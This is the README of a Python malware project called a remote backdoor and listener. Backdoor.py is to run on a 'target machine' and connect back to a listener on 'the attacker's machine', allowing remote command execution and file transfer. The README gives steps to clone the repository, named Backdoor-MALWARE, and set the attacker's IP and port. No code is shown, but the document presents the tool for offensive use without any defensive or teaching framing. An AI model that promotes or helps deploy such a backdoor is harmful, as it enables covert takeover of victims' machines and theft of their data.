# Remote Backdoor and Listener

A Python-based remote backdoor and listener setup for remote command execution and file transfer over TCP/IP.

## Project Overview

This project consists of two main components: `Backdoor.py` and `Listener.py`. 

- **Backdoor.py**: Runs on the target machine and connects back to the Listener, allowing remote command execution and file operations such as download and upload.
  
- **Listener.py**: Runs on the attacker's machine, listens for incoming connections from Backdoor instances, and facilitates command execution and file operations remotely.

## Prerequisites

- Python 3.x installed on both the attacker and target machines.

## Dependencies

The project uses standard Python libraries and does not require additional dependencies beyond what is included in the Python standard library.

## Installation and Setup

1. Clone the repository:

   ```sh
   git clone https://github.com/mohdtarique909/Backdoor-MALWARE.git
   cd Remote-Backdoor

2. Modify the IP address and port in Backdoor.py and Listener.py:

- In Backdoor.py: Update my_backdoor = Backdoor("Your IP Address", Port) with the IP address and port of your Listener.
- In Listener.py: Update my_listener = Listener("Your IP Address", Port) with the IP address and port where the Listener should bind.
